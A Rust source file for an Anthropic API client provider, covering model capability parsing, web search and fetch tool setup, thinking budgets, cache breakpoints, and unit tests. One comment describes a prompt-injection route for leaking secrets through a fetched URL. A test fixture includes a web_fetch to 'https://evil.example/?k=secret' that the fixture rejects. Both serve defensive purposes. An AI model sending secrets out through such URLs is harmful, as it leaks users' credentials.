use anyhow::{Context, Result, bail};
use serde::Deserialize;
use serde_json::json;
use std::collections::HashMap;
use std::sync::Mutex;

use super::{ContentBlock, Message, Provider, Request, Response, Usage};

const API_URL: &str = "https://api.anthropic.com/v1/messages";
const COUNT_TOKENS_URL: &str = "https://api.anthropic.com/v1/messages/count_tokens";
const MODELS_URL: &str = "https://api.anthropic.com/v1/models";

// What a model supports, from the Models API `capabilities` object. Parsed in
// one place (`parse_caps`) so a new capability is one field plus one line.
#[derive(Clone, Copy, Debug, PartialEq)]
pub struct ModelCaps {
    pub web_search: bool,
    // Code execution can call the request's other tools — what dynamic
    // filtering of search results needs.
    pub programmatic_tools: bool,
    // Models without it (e.g. the 4.5 family) take only manual extended thinking.
    pub adaptive_thinking: bool,
}

// Direct-only search works on every web-search-capable model, so it is the
// safe guess when the Models API can't say; adaptive thinking matches every
// current model.
const UNKNOWN_CAPS: ModelCaps = ModelCaps {
    web_search: true,
    programmatic_tools: false,
    adaptive_thinking: true,
};

// The request pieces shaped from one capability lookup.
struct WireParts {
    system: Vec<serde_json::Value>,
    tools: Vec<serde_json::Value>,
    messages: Vec<serde_json::Value>,
    caps: ModelCaps,
    warning: Option<String>,
}

pub struct AnthropicProvider {
    client: reqwest::Client,
    api_key: String,
    caps: Mutex<HashMap<String, ModelCaps>>,
}

impl AnthropicProvider {
    pub fn new(api_key: String) -> Self {
        Self {
            client: reqwest::Client::new(),
            api_key,
            caps: Mutex::new(HashMap::new()),
        }
    }

    // (display label, model id), newest first - whatever the API is currently
    // serving. Also pre-fills the capability cache, since every model's
    // capabilities ride along.
    pub async fn list_models(&self) -> Result<Vec<(String, String)>> {
        let resp = self
            .client
            .get(format!("{MODELS_URL}?limit=1000"))
            .header("x-api-key", &self.api_key)
            .header("anthropic-version", "2023-06-01")
            .send()
            .await
            .context("models request failed")?;
        let resp: ModelsResponse = check_status(resp, "models endpoint")
            .await?
            .json()
            .await
            .context("failed to parse models response")?;
        let mut cache = self.caps.lock().unwrap();
        for m in &resp.data {
            if let Some(caps) = parse_caps(m.capabilities.as_ref()) {
                cache.insert(m.id.clone(), caps);
            }
        }
        Ok(resp
            .data
            .into_iter()
            .map(|m| (m.display_name, m.id))
            .collect())
    }

    // Fetched once per model id and cached for the process; an unknown model
    // falls back to UNKNOWN_CAPS, and only the call that resolved it carries
    // the warning, so the user sees it once.
    async fn model_caps(&self, model: &str) -> (ModelCaps, Option<String>) {
        let cached = self.caps.lock().unwrap().get(model).copied();
        if let Some(caps) = cached {
            return (caps, None);
        }
        let (caps, warning) = match self.fetch_model(model).await {
            Ok(info) => match parse_caps(info.capabilities.as_ref()) {
                Some(caps) => (caps, None),
                None => (
                    UNKNOWN_CAPS,
                    Some(format!(
                        "model {model} reports no capabilities; assuming adaptive thinking and web search without dynamic filtering"
                    )),
                ),
            },
            Err(e) => (
                UNKNOWN_CAPS,
                Some(format!(
                    "couldn't read capabilities for model {model} ({e:#}); assuming adaptive thinking and web search without dynamic filtering"
                )),
            ),
        };
        self.caps.lock().unwrap().insert(model.to_string(), caps);
        (caps, warning)
    }

    async fn fetch_model(&self, model: &str) -> Result<ModelInfo> {
        let resp = self
            .client
            .get(format!("{MODELS_URL}/{model}"))
            .header("x-api-key", &self.api_key)
            .header("anthropic-version", "2023-06-01")
            .send()
            .await
            .context("model request failed")?;
        check_status(resp, "models endpoint")
            .await?
            .json()
            .await
            .context("failed to parse model response")
    }

    // Shared wire shaping: serialize system blocks with `cache_control` on the
    // cache-flagged ones, resolve the tool array (server tools included) with
    // the tool cache marker at its boundary, and the floating history
    // breakpoint on the messages. Both `complete` and `count_tokens` build on
    // this; the per-call fields (max_tokens, thinking) differ because the
    // count_tokens endpoint rejects `max_tokens`.
    async fn wire_parts(&self, req: &Request<'_>) -> WireParts {
        let system: Vec<serde_json::Value> = req
            .system
            .iter()
            .map(|b| {
                if b.cache {
                    json!({ "type": "text", "text": b.text,
                            "cache_control": { "type": "ephemeral" } })
                } else {
                    json!({ "type": "text", "text": b.text })
                }
            })
            .collect();

        let (caps, warning) = self.model_caps(req.model).await;
        let (mut tools, boundary) = tools_for(req, caps);
        if let Some(i) = boundary
            && let Some(serde_json::Value::Object(obj)) = tools.get_mut(i)
        {
            obj.insert("cache_control".into(), json!({ "type": "ephemeral" }));
        }

        WireParts {
            system,
            tools,
            messages: messages_with_floating_breakpoint(req.messages),
            caps,
            warning,
        }
    }
}

// The caller's tools plus any provider-side server tools the request asks for.
// The server tools go first so the caller's stable prefix keeps its order;
// the cache boundary shifts with them.
fn tools_for(req: &Request<'_>, caps: ModelCaps) -> (Vec<serde_json::Value>, Option<usize>) {
    let mut tools = req.tools.clone();
    let mut boundary = req.tool_cache_boundary;
    if req.web_search {
        let server_tools: Vec<_> = [web_search_tool(caps), web_fetch_tool(caps)]
            .into_iter()
            .flatten()
            .collect();
        boundary = boundary.map(|i| i + server_tools.len());
        tools.splice(0..0, server_tools);
    }
    (tools, boundary)
}

fn thinking(caps: ModelCaps, max_tokens: u32, display: &str) -> Option<serde_json::Value> {
    if caps.adaptive_thinking {
        return Some(json!({ "type": "adaptive", "display": display }));
    }
    // Manual thinking needs 1024 <= budget_tokens < max_tokens; half the
    // output budget leaves the other half for the answer. Below that floor
    // there is no valid budget, so the request goes without thinking.
    let budget = max_tokens / 2;
    (budget >= 1024)
        .then(|| json!({ "type": "enabled", "budget_tokens": budget, "display": display }))
}

fn complete_body(req: &Request<'_>, parts: WireParts) -> serde_json::Value {
    let mut body = json!({
        "model": req.model,
        "system": parts.system,
        "max_tokens": req.max_tokens,
        "tools": parts.tools,
        "messages": parts.messages,
    });
    if let Some(thinking) = thinking(parts.caps, req.max_tokens, req.thinking_display) {
        body["thinking"] = thinking;
    }
    if let Some(container) = req.container {
        body["container"] = json!(container);
    }
    body
}

// Dynamic filtering (search or fetch results filtered by code before they
// reach context) needs programmatic tool calling; without it the API rejects
// any caller but "direct". "direct" stays allowed either way so the model can
// still search and fetch without writing code.
fn allowed_callers(caps: ModelCaps) -> serde_json::Value {
    if caps.programmatic_tools {
        json!(["direct", "code_execution_20260120"])
    } else {
        json!(["direct"])
    }
}

fn web_search_tool(caps: ModelCaps) -> Option<serde_json::Value> {
    if !caps.web_search {
        return None;
    }
    Some(json!({
        "type": "web_search_20260318",
        "name": "web_search",
        "max_uses": 5,
        "allowed_callers": allowed_callers(caps),
        "response_inclusion": "excluded",
    }))
}

// The Models API reports no fetch capability, so fetch rides on web search's.
fn web_fetch_tool(caps: ModelCaps) -> Option<serde_json::Value> {
    if !caps.web_search {
        return None;
    }
    Some(json!({
        "type": "web_fetch_20260318",
        "name": "web_fetch",
        "max_uses": 5,
        "max_content_tokens": 25000,
        "allowed_callers": allowed_callers(caps),
        "response_inclusion": "excluded",
        // A prompt injection could make a client tool (e.g. Bash) print a URL
        // with secrets in its query string; fetching it would leak them from
        // Anthropic's servers, past any local firewall.
        "url_sources": { "client_tool_results": { "type": "none" } },
    }))
}

// None only when `capabilities` is null; a field it doesn't report keeps
// the UNKNOWN_CAPS guess, so one missing (e.g. Preview) field doesn't
// discard the ones that are there.
fn parse_caps(caps: Option<&WireCapabilities>) -> Option<ModelCaps> {
    let caps = caps?;
    let supported = |s: Option<&WireSupport>| s.and_then(|s| s.supported);
    Some(ModelCaps {
        web_search: supported(
            caps.server_tools
                .as_ref()
                .and_then(|t| t.web_search.as_ref()),
        )
        .unwrap_or(UNKNOWN_CAPS.web_search),
        programmatic_tools: supported(caps.code_execution.as_ref())
            .unwrap_or(UNKNOWN_CAPS.programmatic_tools),
        adaptive_thinking: supported(
            caps.thinking
                .as_ref()
                .and_then(|t| t.types.as_ref())
                .and_then(|t| t.adaptive.as_ref()),
        )
        .unwrap_or(UNKNOWN_CAPS.adaptive_thinking),
    })
}

impl Provider for AnthropicProvider {
    async fn complete(&self, req: &Request<'_>) -> Result<Response> {
        let parts = self.wire_parts(req).await;
        let warning = parts.warning.clone();
        let body = complete_body(req, parts);
        let resp = self
            .client
            .post(API_URL)
            .header("x-api-key", &self.api_key)
            .header("anthropic-version", "2023-06-01")
            .header("content-type", "application/json")
            .json(&body)
            .send()
            .await
            .context("API request failed")?;
        let resp: MessagesResponse = check_status(resp, "API")
            .await?
            .json()
            .await
            .context("failed to parse API response")?;
        Ok(Response {
            content: resp.content,
            stop_reason: resp.stop_reason,
            usage: Usage {
                input_tokens: resp.usage.input_tokens,
                output_tokens: resp.usage.output_tokens,
                cache_creation_input_tokens: resp.usage.cache_creation_input_tokens,
                cache_read_input_tokens: resp.usage.cache_read_input_tokens,
            },
            container_id: resp.container.map(|c| c.id),
            warning,
        })
    }

    async fn count_tokens(&self, req: &Request<'_>) -> Result<u64> {
        // The count_tokens endpoint rejects `max_tokens` and doesn't need
        // `thinking`; it accepts the same system/tools/messages shape (cache
        // markers included, which it tolerates).
        let parts = self.wire_parts(req).await;
        let body = json!({
            "model": req.model,
            "system": parts.system,
            "tools": parts.tools,
            "messages": parts.messages,
        });
        let resp = self
            .client
            .post(COUNT_TOKENS_URL)
            .header("x-api-key", &self.api_key)
            .header("anthropic-version", "2023-06-01")
            .header("content-type", "application/json")
            .json(&body)
            .send()
            .await
            .context("count_tokens request failed")?;
        let v: serde_json::Value = check_status(resp, "count_tokens")
            .await?
            .json()
            .await
            .context("failed to parse count_tokens")?;
        v["input_tokens"]
            .as_u64()
            .context("count_tokens response missing input_tokens")
    }

    async fn wire_tools(&self, req: &Request<'_>) -> Vec<serde_json::Value> {
        let (caps, _) = self.model_caps(req.model).await;
        tools_for(req, caps).0
    }
}

// Unlike `error_for_status`, keeps the API's error body: its `error.message` is the
// only place the actual reason for a 4xx (e.g. an unsupported request field) appears.
async fn check_status(resp: reqwest::Response, what: &str) -> Result<reqwest::Response> {
    let status = resp.status();
    if status.is_success() {
        return Ok(resp);
    }
    let body = resp.text().await.unwrap_or_default();
    bail!("{what} returned {status}: {}", error_detail(&body))
}

fn error_detail(body: &str) -> String {
    serde_json::from_str::<serde_json::Value>(body)
        .ok()
        .and_then(|v| v["error"]["message"].as_str().map(str::to_string))
        .unwrap_or_else(|| body.trim().to_string())
}

#[derive(Deserialize, Debug)]
struct MessagesResponse {
    content: Vec<ContentBlock>,
    stop_reason: String,
    #[serde(default)]
    usage: WireUsage,
    container: Option<WireContainer>,
}

#[derive(Deserialize, Debug)]
struct WireContainer {
    id: String,
}

#[derive(Deserialize, Debug)]
struct ModelsResponse {
    data: Vec<ModelInfo>,
}

#[derive(Deserialize, Debug)]
struct ModelInfo {
    id: String,
    display_name: String,
    capabilities: Option<WireCapabilities>,
}

// Every field optional: a missing one means "unknown", not "unsupported".
#[derive(Deserialize, Debug)]
struct WireCapabilities {
    code_execution: Option<WireSupport>,
    server_tools: Option<WireServerTools>,
    thinking: Option<WireThinking>,
}

#[derive(Deserialize, Debug)]
struct WireServerTools {
    web_search: Option<WireSupport>,
}

#[derive(Deserialize, Debug)]
struct WireThinking {
    types: Option<WireThinkingTypes>,
}

#[derive(Deserialize, Debug)]
struct WireThinkingTypes {
    adaptive: Option<WireSupport>,
}

#[derive(Deserialize, Debug)]
struct WireSupport {
    supported: Option<bool>,
}

#[derive(Deserialize, Debug, Default)]
struct WireUsage {
    #[serde(default)]
    input_tokens: u64,
    #[serde(default)]
    output_tokens: u64,
    #[serde(default)]
    cache_creation_input_tokens: u64,
    #[serde(default)]
    cache_read_input_tokens: u64,
}

// Serialize `messages` for the API request body, injecting a `cache_control`
// breakpoint on the last content block of the most recent assistant turn.
// The breakpoint floats forward with the conversation: each request marks a
// stable position (the model's already-emitted output, bytes fixed forever),
// so the next request's 20-block lookback finds this entry and reads the
// cached prefix instead of re-paying for the full history. cache_control is
// request-time-only metadata; we don't carry it on the persisted Message
// struct (which would corrupt the wire-faithful schema for JSONL replay).
fn messages_with_floating_breakpoint(messages: &[Message]) -> Vec<serde_json::Value> {
    let breakpoint_idx = messages.iter().rposition(|m| m.role == "assistant");
    messages
        .iter()
        .enumerate()
        .map(|(i, msg)| {
            let mut content: Vec<serde_json::Value> = msg
                .content
                .iter()
                // The API emits empty text blocks (around citation splits) but
                // rejects them on input, so drop them here rather than at ingest:
                // stored sessions stay wire-faithful and still replay.
                .filter(|b| !matches!(b, ContentBlock::Text { text } if text.is_empty()))
                .map(|b| serde_json::to_value(b).expect("ContentBlock always serializes"))
                .collect();
            if Some(i) == breakpoint_idx {
                // cache_control is rejected on thinking/redacted_thinking
                // blocks, and whether server tool or code-execution blocks
                // accept it is undocumented, so walk back to the last block
                // of a type known to take the marker.
                if let Some(last_idx) = content.iter().rposition(|v| {
                    matches!(
                        v.get("type").and_then(|t| t.as_str()),
                        Some("text") | Some("tool_use") | Some("tool_result")
                    )
                }) && let serde_json::Value::Object(obj) = &mut content[last_idx]
                {
                    obj.insert("cache_control".into(), json!({ "type": "ephemeral" }));
                }
            }
            json!({ "role": msg.role, "content": content })
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn models_response_maps_to_label_id_pairs_in_order() {
        let json = r#"{"data": [
            {"id": "claude-opus-4-8", "display_name": "Claude Opus 4.8"},
            {"id": "claude-fable-5", "display_name": "Fable 5"}
        ]}"#;
        let resp: ModelsResponse = serde_json::from_str(json).unwrap();
        let pairs: Vec<(String, String)> = resp
            .data
            .into_iter()
            .map(|m| (m.display_name, m.id))
            .collect();
        assert_eq!(
            pairs,
            vec![
                ("Claude Opus 4.8".to_string(), "claude-opus-4-8".to_string()),
                ("Fable 5".to_string(), "claude-fable-5".to_string()),
            ]
        );
    }

    #[test]
    fn models_response_tolerates_empty_data() {
        let resp: ModelsResponse = serde_json::from_str(r#"{"data": []}"#).unwrap();
        assert!(resp.data.is_empty());
    }

    #[test]
    fn error_detail_surfaces_the_api_message() {
        let body = r#"{"type":"error","error":{"type":"invalid_request_error","message":"tool_choice: type \"tool\" and \"any\" are not supported for this model."}}"#;
        assert_eq!(
            error_detail(body),
            r#"tool_choice: type "tool" and "any" are not supported for this model."#
        );
    }

    #[test]
    fn error_detail_falls_back_to_the_raw_body() {
        assert_eq!(
            error_detail("  upstream connect error \n"),
            "upstream connect error"
        );
    }

    const WEB_SEARCH_RESPONSE: &str = r#"{
        "content": [
            {"type": "server_tool_use", "id": "srvtoolu_1", "name": "web_search",
             "input": {"query": "latest tokio release"}},
            {"type": "web_search_tool_result", "tool_use_id": "srvtoolu_1", "content": [
                {"type": "web_search_result", "url": "https://tokio.rs/blog",
                 "title": "Tokio blog", "encrypted_content": "EqgfCioIARgBIiQ3", "page_age": "2 days ago"}
            ]},
            {"type": "server_tool_use", "id": "srvtoolu_2", "name": "web_search",
             "input": {"query": "tokio changelog"}},
            {"type": "web_search_tool_result", "tool_use_id": "srvtoolu_2",
             "content": {"type": "web_search_tool_result_error", "error_code": "max_uses_exceeded"}},
            {"type": "text", "text": "The latest release is 1.x.",
             "citations": [{"type": "web_search_result_location", "url": "https://tokio.rs/blog",
                            "title": "Tokio blog", "encrypted_index": "Eo8BCioIAhgBIiQy", "cited_text": "..."}]}
        ],
        "stop_reason": "end_turn",
        "usage": {"input_tokens": 10, "output_tokens": 5}
    }"#;

    #[test]
    fn web_search_blocks_round_trip_unchanged() {
        let raw: serde_json::Value = serde_json::from_str(WEB_SEARCH_RESPONSE).unwrap();
        let resp: MessagesResponse = serde_json::from_str(WEB_SEARCH_RESPONSE).unwrap();
        assert_eq!(resp.content.len(), 5);
        for (i, block) in resp.content.iter().take(4).enumerate() {
            assert_eq!(
                serde_json::to_value(block).unwrap(),
                raw["content"][i],
                "block {i} must round-trip byte-faithfully"
            );
        }
        assert!(
            matches!(&resp.content[4], ContentBlock::Text { text } if text == "The latest release is 1.x.")
        );
    }

    #[test]
    fn floating_breakpoint_skips_server_tool_blocks() {
        let resp: MessagesResponse = serde_json::from_str(WEB_SEARCH_RESPONSE).unwrap();
        let mut content = resp.content;
        content.pop();
        let wire = messages_with_floating_breakpoint(&[Message {
            role: "assistant".into(),
            content,
        }]);
        assert!(
            wire[0]["content"]
                .as_array()
                .unwrap()
                .iter()
                .all(|b| b.get("cache_control").is_none()),
            "{wire:?}"
        );
    }

    #[test]
    fn empty_text_blocks_are_dropped_and_breakpoint_lands_on_last_real_block() {
        let text = |t: &str| ContentBlock::Text { text: t.into() };
        let wire = messages_with_floating_breakpoint(&[Message {
            role: "assistant".into(),
            content: vec![text("first"), text(""), text("second"), text("")],
        }]);
        let content = wire[0]["content"].as_array().unwrap();
        assert_eq!(content.len(), 2, "{wire:?}");
        assert_eq!(content[0]["text"], "first");
        assert!(content[0].get("cache_control").is_none());
        assert_eq!(content[1]["text"], "second");
        assert_eq!(content[1]["cache_control"]["type"], "ephemeral");
    }

    const DYNAMIC_FILTERING_RESPONSE: &str = r#"{
        "content": [
            {"type": "text", "text": "Let me search and filter the results."},
            {"type": "server_tool_use", "id": "srvtoolu_exec", "name": "code_execution",
             "input": {"code": "r = await web_search({\"query\": \"tokio 1.50 release\"})\nprint([x['title'] for x in r])"}},
            {"type": "server_tool_use", "id": "srvtoolu_nested", "name": "web_search",
             "input": {"query": "tokio 1.50 release"},
             "caller": {"type": "code_execution_20260120", "tool_id": "srvtoolu_exec"}},
            {"type": "web_search_tool_result", "tool_use_id": "srvtoolu_nested",
             "caller": {"type": "code_execution_20260120", "tool_id": "srvtoolu_exec"},
             "content": [{"type": "web_search_result", "url": "https://tokio.rs/blog",
                          "title": "Tokio blog", "encrypted_content": "EqgfCioIARgBIiQ3", "page_age": null}]},
            {"type": "code_execution_tool_result", "tool_use_id": "srvtoolu_exec",
             "content": {"type": "code_execution_result", "stdout": "['Tokio blog']",
                         "stderr": "", "return_code": 0, "content": []}},
            {"type": "server_tool_use", "id": "srvtoolu_bash", "name": "bash_code_execution",
             "input": {"command": "ls"}},
            {"type": "bash_code_execution_tool_result", "tool_use_id": "srvtoolu_bash",
             "content": {"type": "bash_code_execution_result", "stdout": "", "stderr": "",
                         "return_code": 0, "content": []}},
            {"type": "server_tool_use", "id": "srvtoolu_direct", "name": "web_search",
             "input": {"query": "tokio changelog"}, "caller": {"type": "direct"}},
            {"type": "web_search_tool_result", "tool_use_id": "srvtoolu_direct",
             "caller": {"type": "direct"},
             "content": {"type": "web_search_tool_result_error", "error_code": "max_uses_exceeded"}},
            {"type": "text", "text": ""},
            {"type": "text", "text": "Tokio 1.50 is out.",
             "citations": [{"type": "web_search_result_location", "url": "https://tokio.rs/blog",
                            "title": "Tokio blog", "encrypted_index": "Eo8BCioIAhgBIiQy", "cited_text": "..."}]}
        ],
        "container": {"id": "container_011CZ", "expires_at": "2026-11-08T12:00:00Z"},
        "stop_reason": "end_turn",
        "usage": {"input_tokens": 10, "output_tokens": 5}
    }"#;

    #[test]
    fn dynamic_filtering_blocks_round_trip_and_container_is_parsed() {
        let raw: serde_json::Value = serde_json::from_str(DYNAMIC_FILTERING_RESPONSE).unwrap();
        let resp: MessagesResponse = serde_json::from_str(DYNAMIC_FILTERING_RESPONSE).unwrap();
        assert_eq!(resp.container.unwrap().id, "container_011CZ");
        assert_eq!(resp.content.len(), 11);
        // The last text block drops its citations (Text keeps only `text`).
        for (i, block) in resp.content.iter().take(10).enumerate() {
            assert_eq!(
                serde_json::to_value(block).unwrap(),
                raw["content"][i],
                "block {i} must round-trip"
            );
        }
        assert!(matches!(&resp.content[4], ContentBlock::Other(_)));
        assert!(matches!(&resp.content[6], ContentBlock::Other(_)));
        assert!(
            matches!(&resp.content[2], ContentBlock::ServerToolUse { extra, .. } if extra.contains_key("caller"))
        );
        assert!(crate::llm::ran_code_execution(&resp.content));
    }

    #[test]
    fn floating_breakpoint_skips_code_execution_blocks() {
        let resp: MessagesResponse = serde_json::from_str(DYNAMIC_FILTERING_RESPONSE).unwrap();
        let content: Vec<ContentBlock> = resp.content.into_iter().take(7).collect();
        let wire = messages_with_floating_breakpoint(&[Message {
            role: "assistant".into(),
            content,
        }]);
        let marked: Vec<usize> = wire[0]["content"]
            .as_array()
            .unwrap()
            .iter()
            .enumerate()
            .filter(|(_, b)| b.get("cache_control").is_some())
            .map(|(i, _)| i)
            .collect();
        assert_eq!(marked, [0], "{wire:?}");
    }

    #[test]
    fn missing_container_parses_as_none() {
        let resp: MessagesResponse = serde_json::from_str(WEB_SEARCH_RESPONSE).unwrap();
        assert!(resp.container.is_none());
    }

    #[test]
    fn web_search_tool_shape_follows_caps() {
        let filtering = web_search_tool(ModelCaps {
            programmatic_tools: true,
            ..UNKNOWN_CAPS
        })
        .unwrap();
        assert_eq!(
            filtering,
            json!({"type": "web_search_20260318", "name": "web_search", "max_uses": 5,
                   "allowed_callers": ["direct", "code_execution_20260120"],
                   "response_inclusion": "excluded"})
        );
        let direct = web_search_tool(UNKNOWN_CAPS).unwrap();
        assert_eq!(direct["type"], "web_search_20260318");
        assert_eq!(direct["allowed_callers"], json!(["direct"]));
        assert!(
            web_search_tool(ModelCaps {
                web_search: false,
                programmatic_tools: true,
                ..UNKNOWN_CAPS
            })
            .is_none()
        );
    }

    fn caps_of(model_json: &str) -> Option<ModelCaps> {
        let info: ModelInfo = serde_json::from_str(model_json).unwrap();
        parse_caps(info.capabilities.as_ref())
    }

    #[test]
    fn caps_parse_from_the_models_api() {
        assert_eq!(
            caps_of(
                r#"{"id": "claude-opus-4-8", "display_name": "Opus", "capabilities": {
                    "code_execution": {"supported": true},
                    "server_tools": {"web_search": {"supported": true},
                                     "code_execution": {"supported": true}},
                    "thinking": {"supported": true, "types": {
                        "adaptive": {"supported": true}, "enabled": {"supported": false}}}}}"#
            ),
            Some(ModelCaps {
                web_search: true,
                programmatic_tools: true,
                adaptive_thinking: true,
            })
        );
        assert_eq!(
            caps_of(
                r#"{"id": "claude-haiku-4-5", "display_name": "Haiku", "capabilities": {
                    "code_execution": {"supported": false},
                    "server_tools": {"web_search": {"supported": true},
                                     "code_execution": {"supported": true}},
                    "thinking": {"supported": true, "types": {
                        "adaptive": {"supported": false}, "enabled": {"supported": true}}}}}"#
            ),
            Some(ModelCaps {
                web_search: true,
                programmatic_tools: false,
                adaptive_thinking: false,
            })
        );
    }

    #[test]
    fn caps_are_unknown_only_when_null_and_missing_fields_keep_the_guess() {
        assert_eq!(caps_of(r#"{"id": "m", "display_name": "M"}"#), None);
        assert_eq!(
            caps_of(r#"{"id": "m", "display_name": "M", "capabilities": null}"#),
            None
        );
        assert_eq!(
            caps_of(
                r#"{"id": "m", "display_name": "M", "capabilities": {
                    "thinking": {"types": {"adaptive": {"supported": false}}}}}"#
            ),
            Some(ModelCaps {
                adaptive_thinking: false,
                ..UNKNOWN_CAPS
            })
        );
    }

    #[test]
    fn thinking_shape_follows_caps_and_budget() {
        let manual = ModelCaps {
            adaptive_thinking: false,
            ..UNKNOWN_CAPS
        };
        assert_eq!(
            thinking(UNKNOWN_CAPS, 16384, "summarized"),
            Some(json!({"type": "adaptive", "display": "summarized"}))
        );
        assert_eq!(
            thinking(manual, 16384, "omitted"),
            Some(json!({"type": "enabled", "budget_tokens": 8192, "display": "omitted"}))
        );
        assert_eq!(
            thinking(manual, 2048, "omitted"),
            Some(json!({"type": "enabled", "budget_tokens": 1024, "display": "omitted"}))
        );
        assert_eq!(thinking(manual, 1024, "omitted"), None);
    }

    fn request<'a>(model: &'a str, web_search: bool, messages: &'a [Message]) -> Request<'a> {
        Request {
            model,
            max_tokens: 1,
            thinking_display: "omitted",
            system: Vec::new(),
            tools: vec![json!({"name": "Read"}), json!({"name": "Dormant"})],
            tool_cache_boundary: Some(0),
            web_search,
            container: None,
            messages,
        }
    }

    #[test]
    fn server_tools_go_first_in_order_and_shift_the_boundary() {
        let caps = ModelCaps {
            programmatic_tools: true,
            ..UNKNOWN_CAPS
        };
        let (tools, boundary) = tools_for(&request("m", true, &[]), caps);
        assert_eq!(tools[0]["type"], "web_search_20260318");
        assert_eq!(
            tools[1],
            json!({"type": "web_fetch_20260318", "name": "web_fetch", "max_uses": 5,
                   "max_content_tokens": 25000,
                   "allowed_callers": ["direct", "code_execution_20260120"],
                   "response_inclusion": "excluded",
                   "url_sources": {"client_tool_results": {"type": "none"}}})
        );
        assert_eq!(tools[2]["name"], "Read");
        assert_eq!(boundary, Some(2));

        let (tools, _) = tools_for(&request("m", true, &[]), UNKNOWN_CAPS);
        assert_eq!(tools[0]["allowed_callers"], json!(["direct"]));
        assert_eq!(tools[1]["type"], "web_fetch_20260318");
        assert_eq!(tools[1]["allowed_callers"], json!(["direct"]));

        let no_search = ModelCaps {
            web_search: false,
            ..caps
        };
        for (web_search, caps) in [(false, caps), (true, no_search)] {
            let (tools, boundary) = tools_for(&request("m", web_search, &[]), caps);
            assert_eq!(tools.len(), 2);
            assert_eq!(tools[0]["name"], "Read");
            assert_eq!(boundary, Some(0));
        }
    }

    const WEB_FETCH_RESPONSE: &str = r#"{
        "content": [
            {"type": "server_tool_use", "id": "srvtoolu_f1", "name": "web_fetch",
             "input": {"url": "https://tokio.rs/blog/2026-10-tokio-1-50"}},
            {"type": "web_fetch_tool_result", "tool_use_id": "srvtoolu_f1", "content": {
                "type": "web_fetch_result", "url": "https://tokio.rs/blog/2026-10-tokio-1-50",
                "content": {"type": "document",
                            "source": {"type": "text", "media_type": "text/plain",
                                       "data": "Tokio 1.50 released. This release adds..."},
                            "title": "Announcing Tokio 1.50", "citations": {"enabled": false}},
                "retrieved_at": "2026-11-08T10:00:00.000000+00:00"}},
            {"type": "server_tool_use", "id": "srvtoolu_f2", "name": "web_fetch",
             "input": {"url": "https://example.com/paper.pdf"}},
            {"type": "web_fetch_tool_result", "tool_use_id": "srvtoolu_f2", "content": {
                "type": "web_fetch_result", "url": "https://example.com/paper.pdf",
                "content": {"type": "document",
                            "source": {"type": "base64", "media_type": "application/pdf",
                                       "data": "JVBERi0xLjQKJcOkw7zDtsOf"},
                            "citations": {"enabled": false}},
                "retrieved_at": "2026-11-08T10:00:01.000000+00:00"}},
            {"type": "server_tool_use", "id": "srvtoolu_f3", "name": "web_fetch",
             "input": {"url": "https://evil.example/?k=secret"}},
            {"type": "web_fetch_tool_result", "tool_use_id": "srvtoolu_f3",
             "content": {"type": "web_fetch_tool_result_error", "error_code": "url_not_in_prior_context"}},
            {"type": "server_tool_use", "id": "srvtoolu_exec", "name": "code_execution",
             "input": {"code": "r = await web_fetch({\"url\": \"https://tokio.rs/blog\"})\nprint(len(r))"}},
            {"type": "server_tool_use", "id": "srvtoolu_f4", "name": "web_fetch",
             "input": {"url": "https://tokio.rs/blog"},
             "caller": {"type": "code_execution_20260120", "tool_id": "srvtoolu_exec"}},
            {"type": "web_fetch_tool_result", "tool_use_id": "srvtoolu_f4",
             "caller": {"type": "code_execution_20260120", "tool_id": "srvtoolu_exec"},
             "content": {"type": "web_fetch_result", "url": "https://tokio.rs/blog",
                         "content": {"type": "document",
                                     "source": {"type": "text", "media_type": "text/plain", "data": "Blog"}},
                         "retrieved_at": "2026-11-08T10:00:02.000000+00:00"}},
            {"type": "code_execution_tool_result", "tool_use_id": "srvtoolu_exec",
             "content": {"type": "code_execution_result", "stdout": "1",
                         "stderr": "", "return_code": 0, "content": []}},
            {"type": "text", "text": "Tokio 1.50 adds..."}
        ],
        "stop_reason": "end_turn",
        "usage": {"input_tokens": 10, "output_tokens": 5}
    }"#;

    #[test]
    fn web_fetch_blocks_round_trip_unchanged() {
        let raw: serde_json::Value = serde_json::from_str(WEB_FETCH_RESPONSE).unwrap();
        let resp: MessagesResponse = serde_json::from_str(WEB_FETCH_RESPONSE).unwrap();
        assert_eq!(resp.content.len(), 11);
        for (i, block) in resp.content.iter().enumerate() {
            assert_eq!(
                serde_json::to_value(block).unwrap(),
                raw["content"][i],
                "block {i} must round-trip"
            );
        }
        for i in [1, 3, 5, 8] {
            assert!(
                matches!(&resp.content[i], ContentBlock::WebFetchToolResult { .. }),
                "block {i}"
            );
        }
        assert!(
            matches!(&resp.content[8], ContentBlock::WebFetchToolResult { extra, .. } if extra.contains_key("caller"))
        );
    }

    #[tokio::test]
    async fn request_body_for_a_manual_thinking_model_sends_enabled_thinking() {
        let provider = AnthropicProvider::new(String::new());
        provider.caps.lock().unwrap().insert(
            "claude-haiku-4-5".into(),
            ModelCaps {
                web_search: true,
                programmatic_tools: false,
                adaptive_thinking: false,
            },
        );
        let req = Request {
            max_tokens: 16384,
            ..request("claude-haiku-4-5", true, &[])
        };
        let parts = provider.wire_parts(&req).await;
        assert!(parts.warning.is_none());
        let body = complete_body(&req, parts);
        assert_eq!(body["thinking"]["type"], "enabled");
        assert_eq!(body["thinking"]["budget_tokens"], 8192);
        assert_eq!(body["tools"][0]["allowed_callers"], json!(["direct"]));
        assert_eq!(body["tools"][1]["name"], "web_fetch");
        assert_eq!(body["tools"][1]["allowed_callers"], json!(["direct"]));
    }

    #[test]
    fn list_models_response_carries_caps() {
        let resp: ModelsResponse = serde_json::from_str(
            r#"{"data": [{"id": "a", "display_name": "A", "capabilities": {
                "code_execution": {"supported": true},
                "server_tools": {"web_search": {"supported": false}}}}]}"#,
        )
        .unwrap();
        assert_eq!(
            parse_caps(resp.data[0].capabilities.as_ref()),
            Some(ModelCaps {
                web_search: false,
                programmatic_tools: true,
                adaptive_thinking: true,
            })
        );
    }
}
